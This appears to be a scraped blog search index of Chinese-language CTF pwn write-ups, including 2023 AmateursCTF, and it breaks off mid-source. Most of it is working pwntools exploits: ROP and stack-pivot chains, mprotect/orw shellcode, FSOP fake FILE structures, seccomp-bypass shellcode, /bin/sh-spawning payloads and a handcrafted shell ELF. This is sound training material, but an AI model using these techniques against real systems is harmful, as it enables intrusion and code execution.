'/opt/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('node2.anna.nssctf.cn',28345)bss = 0x404800leave = 0x4012bfpay = b'A' *0x0210 + p64(bss) + p64(0x401292)gdb.attach(io)s(pay)pause()pay = p64(rop.find_gadget(['pop rdi','ret'])[0]) + p64(elf.got['puts']) + p64(elf.sym['puts']) +p64(0x0401270) # vulnpay = pay.ljust(0x0210,b'A')pay += p64(bss-0x218) + p64(leave)s(pay)ru('\\x40\\x0a')x = uu64(r(6))libc_base = x - libc.sym['puts']system = libc_base + libc.sym['system']bin_sh = libc_base + next(libc.search(b'/bin/sh'))ls(hex(libc_base))libc_file = '/opt/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6'libc_file = '/opt/pwn/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6'libc_rop = ROP(libc_file)def f(Str):    return libc_base + libc_rop.find_gadget([Str,'ret'])[0]syscall_ret = f('syscall')pop_rax = f('pop rax')pop_rdi = f('pop rdi')pop_rsi = f('pop rsi')pop_rbx = f('pop rbx')pop_adb   = libc_base +  0x0000000000090528 # pop rax ; pop rdx ; pop rbx ; retpop_adb   = libc_base +  0x000000000015f8c5 # pop rax ; pop rdx ; pop rbx ; retpop_adb   = libc_base +  0x000000000015f8c5 # pop rax ; pop rdx ; pop rbx ; retshellcode = shellcraft.open('/flag')shellcode += shellcraft.read('rax','rsp',100)shellcode += shellcraft.write(1,'rsp',100)shellcode = asm(shellcode)orw_rop = flat(        pop_rdi, bss-0x800,     # rdi addr        pop_rsi, 0x1000, # rsi length        pop_adb, 0,7,0,  # rdx per         libc_base + libc.sym['mprotect'], # 修改 权限        0x404448, # 此时栈已经 rwx了 所以直接返回到栈上执行代码        '\\x90'*0x20,        shellcode         )pay =  orw_roppay = pay.ljust(0x0210,b'B')#x = bss - 0x404610#exe = 0x4045f0-0x1f0#pay += p64(bss-0x1f8) + p64(leave)#pay += p64(bss-0x1f8) + p64(leave)pay += p64(0x4043f0) + p64(leave)pause()s(pay)io.interactive()第一次栈迁移泄露 libc第二次 利用 mprotect 修改 bss 权限 为 rwx ,顺便把 orw shllcode 写到bss上，然后 ret2 shellcode‍xor‍​​​​​​      第一次修改 flag的 高位 为 0xff 也就成负数了,然后就可以一直不退出程序        然后把shellcode 写到 bss 上，    程序退出时会执行 __do_global_dtors_aux_fini_array_entry​ ,相当于got  我们把shellcode 的地址写进去，就可以执行了​__libc_csu_init​ -&gt; lea rbp, __do_global_dtors_aux_fini_array_entry​‍​​  二次读 shellcode​​  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x004006FEcontinue'''.format(**locals())binary = './pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('node1.anna.nssctf.cn',28651)#sc = asm(shellcraft.sh())sc = '''xor eax,eaxxor edi,edipush 0x78pop rdxpush 0x600958pop rsisyscall'''sc = asm(sc)print(len(sc))print(disasm(sc))pause()def w(add,vul):    ru('addr: ')    sl(hex(add))    ru('value: ')    sl('0x' + hex(vul)[2:].rjust(2,'0'))# 改 flag 高位，这样 flag就是负数了w(0x0600BCC+3,0x100-0x10)#gdb.attach(io)# 把 read 的shellcode 写到 bss上read = 0x600958for i in range(0,len(sc)):    p1 = u8(sc[i:i+1])    add = (0x600958 + i)    w(add ,p1)sc = p32(0x400610)for i in range(0,len(sc)):    p1 = u8(sc[i:i+1])    add = 0x600970 + i    w(add ,p1)sc = p32(read)for i in range(0,len(sc)):    p1 = u8(sc[i:i+1])    add = 0x600970 + i    w(add ,p1)#gdb.attach(io,'b *0x400610')# exitw(0x0600BCC+3,0x100-0x10)pause()pay = 0x16 * b'\\x90'pay += asm(shellcraft.sh())sl(pay)io.interactive()‍read_filefrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''b *0x0401478continue'''.format(**locals())binary = './pwn'libelf = ''if (binary!=''): elf  = ELF(binary) ;if (libelf!=''): libc = ELF(libelf)io = start(binary)#io = remote('node5.anna.nssctf.cn',28140)def load_file(name):    ru('&gt;&gt; ')    sl('1')    ru(' : ')    s(name)load_file('dev/null')load_file('flag\\x00fla')ru('&gt;&gt; ')sl('2')ru(' : ')sl('55')#gdb.attach(io)rop=ROP(binary)pay = b'A' * 55 + b'BBBBBBBBCCCCCCCCD'pay += p64(0x401493) + p64(0x0401615) * 2 # 巧妙sl(pay)Girlfriends’ notebooks‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']def start(binary,argv=[], *a, **kw):    '''Start the exploit against the target.'''    if args.GDB:        return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)    else:        return process([binary] + argv, *a, **kw)gdbscript = '''continue'''.format(**locals())binary = './pwn'libelf = '/opt/pwn/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6'if (binary!=''): elf  = ELF(binary) ; rop=ROP(binary)if (libelf!=''): libc = ELF(libelf)def add(idx,size,text):    ru('choice: ')    sl('1')    ru(\"idx: \")    sl(str(idx))    ru('size: ')    sl(str(size))    ru('content: ')    s(text)def show(idx):    ru('choice: ')    sl('2')    ru(\"idx: \")    sl(str(idx))def edit(idx,text):    ru('choice: ')    sl('4')    ru(\"idx: \")    sl(str(idx))    ru(\"content: \")    sl(text)io = start(binary)#io = remote()add(0,0x48,b'a'*0x58+p64(0x1001))#add(0,0x48,b'a'*0x50)add(1,0x2000,b'wsnd')gdb.attach(io)pause()add(4,0x200,'B'*8)show(4)ru('B'*8)main_arena = uu64(r(6))ls(hex(main_arena))libc_base = main_arena - 2204400__free_hook = libc_base + libc.sym['__free_hook']system = libc_base + libc.sym['system']log.success(hex(main_arena))log.success(hex(libc_base))io_file = FileStructure()libc.address = libc_baserop  = ROP(libc)pop_rbp_addr = rop.find_gadget([\"pop rbp\",\"ret\"])[0]leave_ret_addr = rop.find_gadget([\"leave\",\"ret\"])[0]standard_FILE_addr = libc.sym['_IO_2_1_stdout_']_IO_wfile_jumps_addr = libc.sym[\"_IO_wfile_jumps\"]fake_rbp_addr = libc.address+0x21a860-8 # libc.address+0x21a860-8 开始写 rop 链io_file.flags = 0 io_file._IO_read_ptr = pop_rbp_addrio_file._IO_read_end = fake_rbp_addrio_file._IO_read_base = leave_ret_addrio_file._IO_write_base = 0io_file._IO_write_ptr = 1io_file.unknown2 |= (0 &lt;&lt; 192)io_file._lock = standard_FILE_addr-0x10io_file.chain = leave_ret_addrio_file._codecvt = standard_FILE_addrio_file._wide_data = standard_FILE_addr - 0x48io_file.vtable = _IO_wfile_jumps_addrrdi = rop.find_gadget([\"pop rdi\",\"ret\"])[0]rsi = rop.find_gadget([\"pop rsi\",\"ret\"])[0]rdx= rop.find_gadget([\"pop rdx\",\"pop r12\",\"ret\"])[0]open_ = libc.sym['open']read_= libc.sym['read']puts = libc.sym['puts']write_ = libc.sym['write']flag = libc.address+0x21a908payload = bytes(io_file)payload += p64(rdi)+p64(flag)+p64(rsi)+p64(0)+p64(open_)payload += p64(rdi)+p64(3)+p64(rsi)+p64(libc.address+0x21af00)+p64(rdx)+p64(0xff)+p64(0)+p64(read_)payload += p64(rdi)+p64(1)+p64(rsi)+p64(libc.address+0x21af00)+p64(rdx)+p64(0xff)+p64(0)+p64(write_)payload += b\"/flag\\x00\"ls(hex(fake_rbp_addr))edit(-8,payload)io.interactive()"
  },
  
  {
    "title": "2023-AmateursCTF-WriteUps",
    "url": "/posts/AmateursCTF/",
    "categories": "CTF",
    "tags": "CTF",
    "date": "2023-07-19 20:55:00 +0800",
    





    
    "snippet": "https://ctf.amateurs.team/1.pwn-rntk  代码恢复  程序自己生产里一个类似 canary 的东西，溢出检测#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include &lt;time.h&gt;long long int global_canary=NULL...",
    "content": "https://ctf.amateurs.team/1.pwn-rntk  代码恢复  程序自己生产里一个类似 canary 的东西，溢出检测#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#include &lt;time.h&gt;long long int global_canary=NULL;int win(){  char s[72]; // [rsp+0h] [rbp-50h] BYREF  FILE *stream; // [rsp+48h] [rbp-8h]  stream = fopen(\"flag.txt\", \"r\");  if ( !stream )  {    puts(\"flag file not found\");    exit(1);  }  fgets(s, 64, stream);  return puts(s);}int random_guess(){  char nptr[40]; // [rsp+0h] [rbp-30h] BYREF  int v2; // [rsp+28h] [rbp-8h]  int v3; // [rsp+2Ch] [rbp-4h]  printf(\"Enter in a number as your guess: \");  v3 = global_canary;  gets(nptr);  v2 = strtol(nptr, 0LL, 10);  if ( v3 != global_canary ) // 溢出检测  {    puts(\"***** Stack Smashing Detected ***** : Canary Value Corrupt!\");    exit(1);  }  if ( v2 == rand() )    return puts(\"Congrats you guessed correctly!\");  else    return puts(\"Better luck next time\");}int generate_canary(){  unsigned int v0; // eax  int result; // eax  v0 = time(0LL);  srand(v0);  result = rand();  global_canary = result;  return result;}int  main(){  unsigned int v3; // eax  int v4; // [rsp+Ch] [rbp-4h] BYREF  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);  generate_canary();  while ( 1 )  {    puts(\"Please select one of the following actions\");    puts(\"1) Generate random number\");    puts(\"2) Try to guess a random number\");    puts(\"3) Exit\");    v4 = 0;    scanf(\"%d\", &amp;v4);    getchar();    if ( v4 == 3 )      break;    if ( v4 &lt;= 3 )    {      if ( v4 == 1 )      {        v3 = rand();        printf(\"%d\\n\", v3);      }      else if ( v4 == 2 )      {        random_guess();      }    }  }  exit(0);}// gcc main.c -fno-stack-protector  使用time 预测计算 伪随机，进行预测canary的值然后覆盖 returnfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']io = process(binary)io = remote('amt.rs',31175)win = 0x04012BAfrom ctypes import *import timecli = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')cli.srand(int(time.time()))v3 = cli.rand()print(v3)ru('3) Exit\\n')#gdb.attach(io)sl('2')ru(': ')pay = (44) * b'A' + p32(v3) + p64(0) + p64(win)sl(pay)io.interactive()# amateursCTF{r4nd0m_n0t_s0_r4nd0m_after_all}2.pwn-permissions      源码          沙箱 只允许 read write exit      #include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;seccomp.h&gt;#include &lt;err.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void setup_seccomp () {    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_KILL);    int ret = 0;    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);    ret |= seccomp_load(ctx);    if (ret) {        errx(1, \"seccomp failed\");    }}int main () {    setbuf(stdout, NULL);    setbuf(stderr, NULL);    alarm(6);    int fd = open(\"flag.txt\", O_RDONLY);    if (0 &gt; fd)        errx(1, \"failed to open flag.txt\");    char * flag = mmap(NULL, 0x1000, PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);    if (flag == MAP_FAILED)        errx(1, \"failed to mmap memory\");    if (0 &gt; read(fd, flag, 0x1000))        errx(1, \"failed to read flag\");    close(fd);    // make flag write-only    if (0 &gt; mprotect(flag, 0x1000, PROT_WRITE))        errx(1, \"failed to change mmap permissions\");    char * code = mmap(NULL, 0x100000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);    if (code == MAP_FAILED)        errx(1, \"failed to mmap shellcode buffer\");    printf(\"&gt; \");    if (0 &gt; read(0, code, 0x100000))        errx(1, \"failed to read shellcode\");    setup_seccomp();    ((void(*)(char *))code)(flag);    exit(0);}  程序沙箱=[06:06:12]-➤  seccomp-tools dump ./chal&gt; 1 line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009 0008: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0010: 0x06 0x00 0x00 0x00000000  return KILL  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']io = process(binary)io = remote('amt.rs',31174)pay = asm('''    xchg rax,rsi    push 1    pop rax    push 1    pop rdi    push 50    pop rdx    syscall        ''')#gdb.attach(io,'b *$rebase(0x01553)')sl(pay)io.interactive()# amateursCTF{exec_1mpl13s_r34d_8751fda0}  SYS_write_ 输出flag​​‍‍3.pwn-hex-converter-1  源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    setbuf(stdout, NULL);    setbuf(stderr, NULL);    int i = 0;    char name[16];    printf(\"input text to convert to hex: \\n\");    gets(name);    char flag[64];    fgets(flag, 64, fopen(\"flag.txt\", \"r\"));    // TODO: PRINT FLAG for cool people ... but maybe later    while (i &lt; 16)    {        // the &amp; 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe        printf(\"%02X\", (unsigned int)(name[i] &amp; 0xFF));        i++;    }    printf(\"\\n\");}利用溢出覆盖  v7 的值为负数，然后就可以printf flag_data 了​​  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''lcontext.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)io = remote('amt.rs',31630)ru('input text to convert to hex: \\n')pay = b'A' * (28) +  p64(0x100000000 + (-64))#gdb.attach(io)sl(pay)x = io.recvline()[:-1]print(bytes.fromhex(x.decode()))io.interactive()‍4.pwn-hex-converter-2  源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    setbuf(stdout, NULL);    setbuf(stderr, NULL);    int i = 0;    char name[16];    printf(\"input text to convert to hex: \\n\");    gets(name);    char flag[64];    fgets(flag, 64, fopen(\"flag.txt\", \"r\"));    // TODO: PRINT FLAG for cool people ... but maybe later    while (1)    {        // the &amp; 0xFF... is to do some typecasting and make sure only two characters are printed ^_^ hehe        printf(\"%02X\", (unsigned int)(name[i] &amp; 0xFF));        // exit out of the loop        if (i &lt;= 0)        {            printf(\"\\n\");            return 0;        }        i--;    }}‍IDA 打开如果把 v7 覆盖成 负数，确实可以 泄露 flag,但是只能泄露一个，我们可以写个循环来一个一个字符泄露flag​​‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)flag = ''for i in range(140):    #io = process(binary)    io = remote('amt.rs',31631)    ru('input text to convert to hex: \\n')    pay = b'A' * (28) +  p64(0x100000000 + (-64)+i)    sl(pay)    flag += chr(int(io.recv(2),16))    print(flag)    io.close()#x = io.recvline()[:-1]#print(bytes.fromhex(x.decode()))#io.interactive(‍​​amateursCTF{an0ther_e4sier_0ne_t0_offset_unvariant_while_l00p}‍5.pwn-i-love-ffi  源码#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/mman.h&gt;struct MmapArgs {    uint64_t * addr;    uint64_t length;    int protection;    int flags;    int fd;    uint64_t offset;};extern struct MmapArgs mmap_args();int main () {    setbuf(stdout, NULL);    setbuf(stderr, NULL);    struct MmapArgs args = mmap_args();    char * buf = mmap(args.addr, args.length, args.protection, MAP_PRIVATE | MAP_ANON, args.fd, args.offset);    if (buf &lt; 0) {        perror(\"failed to mmap\");    }    read(0, buf, 0x1000);    printf(\"&gt; \");    int op;    if (scanf(\"%d\", &amp;op) == 1) {        switch (op) {            case 0:                ((void (*)(void))buf)();                break;            case 1:                puts(buf);                break;        }    }}‍‍DIA 打开 自定义libc 函数 mmap_args​​‍自定义libc​​​​看下实际给谁赋的值​​​​        addr: 0x0  # rdi        len: 0x190 # rsi        prot: 0x7  # rdx        flags: 0x21 # r10        fd: 0xffffffff # r8        offset: 0x0 # r9‍from pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)#io = remote()addr = 0x30000Len = 0x1000fd =  0offset = 0prot = 7sla(\"&gt;\",str(addr))sla(\"&gt;\",str(Len))sla(\"&gt;\",str(fd))sla(\"&gt;\",'0')sla(\"&gt;\",str(offset))gdb.attach(io)sla(\"&gt;\",str(prot))io.interactive()‍​​mmap 申请的 0x3000​​‍然后下面就是读一段shellcode,直接发送过去，然后 去执行‍‍​​  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)io = remote('amt.rs',31172)addr = 0x30000Len = 0x1000fd =  0offset = 0prot = 7sla(\"&gt;\",str(addr))sla(\"&gt;\",str(Len))sla(\"&gt;\",str(fd))sla(\"&gt;\",'0')sla(\"&gt;\",str(offset))sla(\"&gt;\",str(prot))shellcode = asm(shellcraft.sh())sl(shellcode)#gdb.attach(io)sla(\"&gt;\",'0')io.interactive()# amateursCTF{1_l0v3_struct_p4dding}‍6.pwn-ELFcrafting-v1  源码#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;time.h&gt;int main(int argc, const char **argv, const char **envp){    int fd; // [rsp+28h] [rbp-38h]    int v6; // [rsp+2Ch] [rbp-34h]    int v7; // [rsp+2Ch] [rbp-34h]    char buf[40]; // [rsp+30h] [rbp-30h] BYREF    setbuf(stdout, 0LL);    setbuf(stderr, 0LL);    puts(\"I'm sure you all enjoy doing shellcode golf problems.\");    puts(\"But have you ever tried ELF golfing?\");    puts(\"Have fun!\");    fd = memfd_create(\"golf\", 0LL);    if ( fd &lt; 0 )    {        perror(\"failed to execute fd = memfd_create(\\\"golf\\\", 0)\");        exit(1);    }    v6 = read(0, buf, 0x20uLL);    if ( v6 &lt; 0 )    {        perror(\"failed to execute ok = read(0, buffer, 32)\");        exit(1);    }    printf(\"read %d bytes from stdin\\n\", v6);    v7 = write(fd, buf, v6);    if ( v7 &lt; 0 )    {        perror(\"failed to execute ok = write(fd, buffer, ok)\");        exit(1);    }    printf(\"wrote %d bytes to file\\n\", v7);    if ( fexecve(fd, argv, envp) &lt; 0 )    {        perror(\"failed to execute fexecve(fd, argv, envp)\");        exit(1);    }    return 0;}‍参考大佬wpAmateurCTF '23 - Pwn - Elfcrafting-V1 (theflash2k.me)‍​​‍​​​​‍amateursCTF{i_th1nk_i_f0rg0t_about_sh3bangs_aaaaaargh}​7.pwn-ELFcrafting-v2  源码#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;time.h&gt;int  main(int argc, const char **argv, const char **envp){    int fd; // [rsp+24h] [rbp-6Ch]    int v6; // [rsp+28h] [rbp-68h]    int v7; // [rsp+28h] [rbp-68h]    int s1; // [rsp+2Ch] [rbp-64h] BYREF    char buf[88]; // [rsp+30h] [rbp-60h] BYREF      setbuf(stdout, 0LL);    setbuf(stderr, 0LL);    puts(\"I'm sure you all enjoy doing shellcode golf problems.\");    puts(\"But have you ever tried ELF golfing?\");    puts(\"Have fun!\");    s1 = 1179403647; // ELF 文件头    fd = memfd_create(\"golf\", 0LL);    if ( fd &lt; 0 )    {        perror(\"failed to execute fd = memfd_create(\\\"golf\\\", 0)\");        exit(1);    }    v6 = read(0, buf, 0x4FuLL);    if ( v6 &lt; 0 )    {        perror(\"failed to execute ok = read(0, buffer, 79)\");        exit(1);    }    printf(\"read %d bytes from stdin\\n\", v6);    if ( memcmp(&amp;s1, buf, 4uLL) )    {        puts(\"not an ELF file :/\");        exit(1);    }    v7 = write(fd, buf, v6);    if ( v7 &lt; 0 )    {        perror(\"failed to execute ok = write(fd, buffer, ok)\");        exit(1);    }    printf(\"wrote %d bytes to file\\n\", v7);    if ( fexecve(fd, (char *const *)argv, (char *const *)envp) &lt; 0 )    {        perror(\"failed to execute fexecve(fd, argv, envp)\");        exit(1);    }    return 0;}  超级短小的 ELF 文件BITS 32    org 0x00010000    db 0x7F, \"ELF\"    dd 1    dd 0    dd $$    dw 2    dw 3    dd _start    dd _start    dd 4_cont:    mov dl, 0xff    int 0x80    mov ebx, eax    mov al, 3    jmp _end    dw 0x20    dw 1_start:    mov al, 11    mov ebx, string_start    int 0x80_end:    mov ecx, esp    int 0x80    xor ebx, ebx    mov al, 4    int 0x80string_start:    db \"/bin/sh\"string_len equ $ - string_startfilesize equ $ - $$‍nasm -f bin -o Execve Execve.asm &amp;&amp; chmod +x Execve &amp;&amp; hexdump -C Execve‍​​elf = \"7f454c46010000000000000000000100020003002e0001002e00010004000000b2ffcd8089c3b003eb0d20000100b00bbb41000100cd8089e1cd8031dbb004cd802f62696e2f7368\"直接吧这个 bin 发送出去，‍  exploitfrom pwn import *#io = process('./chal')io = remote('amt.rs', 31179)io.recv()with open('./shell', 'rb') as f:    buf = f.read()io.sendline(buf + b'\\x00')io.sendline('cat flag.txt')io.interactive()‍​​‍amateursCTF{d1d_i_f0rg3t_t0_p4tch_32b1t_b1naries_t00!!!}‍‍8.pwn-simple-heap-v1‍可以修改一个值​​‍‍  exploitfrom pwn import *s       = lambda data               :io.send(data)sa      = lambda delim,data         :io.sendafter(str(delim), data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(str(delim), data)r       = lambda num                :io.recv(num)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)itr     = lambda                    :io.interactive()uu32    = lambda data               :u32(data.ljust(4,b'\\x00'))uu64    = lambda data               :u64(data.ljust(8,b'\\x00'))ls      = lambda data               :log.success(data)binary = './chal'libelf = ''context.arch      = 'amd64'context.log_level = 'debug'context.terminal  = ['tmux','splitw','-h','-l','130']#elf =  ELF(binary)#libc = ELF(libelf)io = process(binary)io = remote('amt.rs',31176)#gdb.attach(io,'b *$rebase(0x001600)')def getchunk(size,data):    sla('size: ',str(size))    sla('data: ',data)pay = 0x18 * \"A\"ru('Welcome to the flag checker\\n')getchunk(len(pay),pay)ru(\"I'll give you three chances to guess my flag.\\n\")getchunk(len(pay),pay)ru('index: ')sl('-8')ru('new character:')sl('\\x91')pay = 0x80 * \"A\"getchunk(len(pay),pay)io.interactive()‍我们来动态调试分析程序‍‍-8 是我提前计算好的，我们先传进去，然后继续分析‍​‍ptr + (-8) 也就是我们 堆块ptr的size​​修改之前的堆布局，我们等会给 这个 0x21 改成 大一点，只要可以 覆盖 下面的 tcachebins就可以了​​执行完 *(ptr + v4) = v3;​ 后 的堆布局​堆布局状态​‍执行完这个free后‍​​‍​​后面先是申请一个堆块，然后check() 里面再次申请一个堆块‍​​‍执行 getchunk()后， 此时 下面的tcachebins 已经被破坏，但是check()里的申请0x80仍然可以申请到‍​​跟进去​​执行后​​也是申请到了这里​​‍然后就是 open flag 把内容 放到这个堆块里​​​​‍然后就可以‍​​‍远程​​‍flag{wh0_kn3w_y0u_c0uld_unm4p_th3_libc}‍9.pwn-perfect-sandbox  这是一个完美的沙盒，绝对没有办法泄露flag！‍  源码#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;err.h&gt;#include &lt;time.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/mman.h&gt;#include &lt;string.h&gt;#include &lt;linux/seccomp.h&gt;#include &lt;seccomp.h&gt;void setup_seccomp () {    scmp_filter_ctx ctx;    ctx = seccomp_init(SCMP_ACT_KILL);    int ret = 0;    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);    ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);    ret |= seccomp_load(ctx);    if (ret) {        errx(1, \"seccomp failed\");    }}int main () {    setbuf(stdout, NULL);    setbuf(stderr, NULL);    char * tmp = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANON | 